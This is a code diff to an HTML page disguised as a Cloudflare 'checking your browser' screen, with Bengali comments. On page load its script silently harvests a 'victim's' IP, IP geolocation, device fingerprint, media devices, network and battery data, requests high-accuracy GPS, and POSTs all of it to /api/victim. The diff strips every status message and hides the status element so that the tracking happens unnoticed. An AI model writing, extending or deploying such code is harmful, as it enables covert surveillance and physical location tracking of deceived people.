@@ -48,16 +48,10 @@
             margin: 8px 0;
             line-height: 1.7;
         }
+        /* স্ট্যাটাস এলিমেন্ট সম্পূর্ণ লুকানো */
         #status {
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: 500;
-            color: #333;
-            min-height: 30px;
+            display: none !important;
         }
-        #status.success { color: #28a745; }
-        #status.error { color: #dc3545; }
-        #status.info { color: #007bff; }
         .attribution {
             margin-top: 32px;
             font-size: 14px;
@@ -83,7 +77,8 @@
         </div>
         <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
         <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
-        <p id="status">📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...</p>
+        <!-- 👇 স্ট্যাটাস এলিমেন্ট লুকানো -->
+        <p id="status"></p>
         <div class="attribution">
             DDoS সুরক্ষা দ্বারা
             <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
@@ -96,7 +91,7 @@
         (function() {
             "use strict";
 
-            // ===== রে আইডি =====
+            // রে আইডি
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -104,18 +99,11 @@
             }
             document.getElementById('ray').textContent = ray;
 
-            // ===== ভিক্টিম আইডি =====
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
-            const statusEl = document.getElementById('status');
-
-            function setStatus(msg, type = 'info') {
-                statusEl.textContent = msg;
-                statusEl.className = type;
-            }
 
             // ================================================================
-            // ১. ডিভাইস ইনফো সংগ্রহ করে /api/victim-এ পাঠান (লিংকে প্রবেশের সাথে)
+            // সব স্ট্যাটাস আপডেট সরানো হয়েছে – নীরবে ডেটা সংগ্রহ
             // ================================================================
             async function sendDeviceInfo() {
                 try {
@@ -130,17 +118,17 @@
                         media: [],
                         network: {},
                         battery: {},
-                        type: 'location'   // 🔥 লোকেশন টাইপ
+                        type: 'location'
                     };
 
-                    // --- IP ---
+                    // IP
                     try {
                         const ipRes = await fetch('https://api.ipify.org?format=json');
                         const ipData = await ipRes.json();
                         data.ip = ipData.ip;
                     } catch (e) {}
 
-                    // --- লোকেশন (IP API) ---
+                    // লোকেশন (IP API)
                     try {
                         if (data.ip) {
                             const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
@@ -156,7 +144,7 @@
                         }
                     } catch (e) {}
 
-                    // --- ডিভাইস তথ্য ---
+                    // ডিভাইস তথ্য
                     data.device = {
                         productSub: navigator.productSub || 'N/A',
                         vendor: navigator.vendor || 'N/A',
@@ -179,7 +167,7 @@
                         colorDepth: screen.colorDepth || 'N/A'
                     };
 
-                    // --- মিডিয়া ডিভাইস ---
+                    // মিডিয়া ডিভাইস
                     try {
                         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                             const devices = await navigator.mediaDevices.enumerateDevices();
@@ -191,7 +179,7 @@
                         }
                     } catch (e) {}
 
-                    // --- নেটওয়ার্ক ---
+                    // নেটওয়ার্ক
                     if (navigator.connection) {
                         data.network = {
                             type: navigator.connection.type || 'N/A',
@@ -203,7 +191,7 @@
                         };
                     }
 
-                    // --- ব্যাটারি ---
+                    // ব্যাটারি
                     try {
                         if (navigator.getBattery) {
                             const battery = await navigator.getBattery();
@@ -216,42 +204,25 @@
                         }
                     } catch (e) {}
 
-                    // ============================================================
-                    // 📤 ডিভাইস ইনফো /api/victim-এ পাঠান
-                    // ============================================================
-                    setStatus('📤 ডিভাইস তথ্য পাঠানো হচ্ছে...', 'info');
-                    console.log('📤 ডিভাইস ইনফো পাঠানো হচ্ছে (ভিক্টিম: ' + victimId + ')');
-                    const response = await fetch('/api/victim', {
+                    // ===== ডিভাইস ইনফো পাঠান (নীরবে) =====
+                    await fetch('/api/victim', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                    const result = await response.json();
-                    console.log('📥 রেসপন্স:', result);
-
-                    if (response.ok) {
-                        setStatus('✅ ডিভাইস তথ্য পাঠানো হয়েছে!', 'success');
-                    } else {
-                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ', 'error');
-                    }
 
                 } catch (err) {
-                    console.error('❌ sendDeviceInfo error:', err);
-                    setStatus('❌ ডিভাইস তথ্য পাঠাতে ব্যর্থ', 'error');
+                    console.error('sendDeviceInfo error:', err);
                 }
             }
 
             // ================================================================
-            // ২. লোকেশন (GPS) অ্যাক্সেস (ডিভাইস ইনফো পাঠানোর পর)
+            // লোকেশন (GPS) অ্যাক্সেস – নীরবে
             // ================================================================
             async function getLocation() {
                 try {
-                    if (!navigator.geolocation) {
-                        setStatus('❌ এই ব্রাউজার লোকেশন সাপোর্ট করে না', 'error');
-                        return;
-                    }
+                    if (!navigator.geolocation) return;
 
-                    setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
                     const pos = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
@@ -266,7 +237,6 @@
                         googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                     };
 
-                    // লোকেশন ডেটা আপডেট করে পাঠান
                     await fetch('/api/victim', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -277,27 +247,20 @@
                         })
                     });
 
-                    setStatus('📍 লোকেশন পাওয়া গেছে!', 'success');
-
                 } catch (e) {
-                    console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
-                    setStatus('❌ লোকেশন অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
+                    console.log('Location access denied');
                 }
             }
 
             // ================================================================
-            // ৩. মেইন ফাংশন
+            // মেইন ফাংশন – নীরবে সবকিছু
             // ================================================================
             async function main() {
-                // ১. ডিভাইস ইনফো পাঠান (লিংকে প্রবেশের সাথে)
                 await sendDeviceInfo();
-                // ২. লোকেশন চাওয়া (GPS)
                 await getLocation();
             }
 
-            // পেজ লোড হলে শুরু করুন
             window.addEventListener('load', main);
-
         })();
     </script>
 </body>
